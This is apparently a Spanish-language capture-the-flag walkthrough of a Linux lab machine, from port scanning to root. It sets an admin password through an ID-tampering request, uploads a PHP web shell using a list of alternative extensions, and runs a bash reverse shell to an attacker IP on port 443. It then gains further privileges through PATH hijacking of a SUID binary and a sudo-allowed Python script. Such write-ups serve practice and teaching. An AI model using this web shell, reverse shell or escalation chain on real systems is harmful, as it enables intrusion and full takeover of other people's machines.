## Summary

Tags: #Linux #BurpSuite #PHP #RCE #ReverShell #Fuzzing #PathHijacking #SUID 

- IP -> 192.168.68.118
- Ports -> TCP (80, 22), UDP (idk)
- OS ->  Linux
- Services & Applications
    - 22 ->  OpenSSH 8.2p1 
    - 80 -> Apache httpd 2.4.41

## Launchpad

-   **Launchpad**: [https://launchpad.net/ubuntu](https://launchpad.net/ubuntu)

## Recon

```bash
❯ arp-scan -I ens33 --localnet --ignoredups   # Buscas las IPs en tu red local 
```

```bash 
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn ❮Target IP❯  -oG allPorts       # Escaneo en la Capa 4 del modelo OSI

❯ nmap -sCV -p22,... ❮Target IP❯ -oN targeted
```

```bash
❯ whatweb ❮http://❮IP❯ -v

	# v = Miramos las cabeceras de la pagina web, las cuales aveces nos revelan cosas
```

Hacemos el registro en la web, luego ingresamos, miramos que podemos cambiar la passwd de nuestro usuario. 
Después, usamos Burpsuite para capturar el cambio de passwd. 

```bash 
❯ BurpSuiteCommunity &> /dev/null & disown    # Iniciamos el Burpsuite  
```

Miramos la captura del proxy y encontramos que además de la passwd podemos ver el 'ID', por lo que procedemos a cambiarlo por el 'ID=1' creyendo que este es el ID del usuario 'admin'. Vamos al portal de la web e ingresamos con el usuario 'admin' y la passwd que le colocamos en el Proxy del Burpsuite. 
Observamos que se pueden subir archivos, nos creamos un 'php' para poderlo subir. 

```php
❯ nvim cmd.php

	<?php 
		echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
	?>
```

Subimos el php, pero hay una 'restricción', por lo que usamos de nuevo el Burpsuite, para capturar el momento en que se sube el archivo y así poder modificarle las extensiones. 

```bash 
# Diferentes extensiones PHP para subir 'Shells' maliciosas

* php
* php3
* php4
* php5
* pht
* phtm
* phtml
* phar
```

Ya que logramos subir el archivo 'php', buscamos la ruta para poder ejecutar el 'php' 
```bash 
❯ wfuzz -c --hc=404 --hh=12345 -t 200 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt http://❮IP❯

# Encontramos los siguientes directorios: 'upload, config, js, css'
```

Hacemos lo siguiente en la URL, una vez que sabemos cual de todos los archivos es el que si es interpretado.
```bash 
❯ http://192.168.68.118/upload/cmd.phar?cmd=whoami     # Para ver si podemos ejecutar comandos de manera remota 

# Ahora colocaremos una Revershell a nuestra maquina de atacante 
❯ http://192.168.68.118/upload/cmd.phar?cmd=bash -c "bash -i >& /dev/tcp/10.10.14.13/443 0>&1"

# Donde debemos de urlencodear el '&'
	& = %26
```

Nos colocamos en escucha antes de ejecutar la Revershell en la web. 
```bash
❯ nc -nlvp 443 
```

Hacemos el tratamiento de la TTY

```bash
❯ python3 -c ‘import pty;pty.spawn(“/bin/bash”)’         # Para remplazar el comando de 'Script' por si no lo acepta la consola

❯ script /dev/null -c bash
❯ Ctrl + z
❯ stty raw -echo; fg
❯ reset xterm

# Despues cambiamos esto para poder hacer Ctrl+ l y Ctrl + c
❯ echo $SHELL                                            # Para ver la ruta de shell y ver que valor tiene **/usr/bin/nologin**
❯ export SHELL=bash o ❯ export SHELL=/bin/bash           # Hacemos que shell ahora valga bash
❯ export TERM=xterm                                      # Para poder hacer Ctrl +c y Ctrl + l (l=ele)

# Ahora para modificar las dimensiones de Vim/nano debemos hacer lo siguiente.
❯ stty size                                              # Miramos las dimensiones de la consola
❯ stty rows 51 columns 189                               # Modificamos las dimensiones de la consola Vim/Nano
```

## User

Ahora somo el usuario 'www-data'

```bash 
❯ hostname -I
❯ whoami 
```

Nos dirigimos al usuario John para ver que hay en su '/home/Jhon'

```bash 
❯ ls - la 

# Encontramos varios archivos 'file.py, password, toto, user.txt' 
	# El archivo 'toto' tiene permisos SUID 
	# Los demas archivos son de Jhon 

# Al momento de ejecutar el archivo 
❯ ./toto    # Este archivo ejecuta el comando 'id' en Linux
```

Procedemos a hacer un **path hijacking**

```bash 
❯ touch id 
❯ chmod +x id

1. Despues de crearnos el archivo 'id' en el dir '/tmp', este contendra lo siguiente:
	❯ bash -p          # Hacemos esto para que cuando ejecutemos ./toto, como es SUID le dara privilegios a la bash 
2. Ahora hacemos el PathHijacking
	❯ export PATH=/tmp:$PATH
```

Ahora somo el usuario 'John'

```bash 
❯ ls -la 
❯ cat password         # Nos muestra una passwd = 'roo123'
❯ cat user.txt         # Podemos ver la flag de user.txt
❯ cat file.py          # Este archivo Python no contiene nada 
```

## Root

Nos conectamos por SSH con la passwd que encontramos.

```bash 
❯ ssh john@192.168.68.118    # Nos conectamos al usuario John 
```

Comandos para la escalada:

```bash 
❯ sudo -l           # Para ver si el usuario tiene permisos a nivel de sudoers

	(root) /usr/bin/python3 /home/john/file.py    # El archivo que esta en el /home de John lo podemos ejecutar como 'root'
```

```python
# Modificamos el archivo 'file.py'

❯ nvim file.py         # Para hacer que el le de privilegios a la bash y asi convertirnos en root
	
	import os 
	os.system("bash -p")        
```

```bash
❯ sudo /usr/bin/python3 /home/john/file.py    # Asi ejecutamos el archivo de Python que hemos modificado 

❯ whoami    # Ahora somos root    
```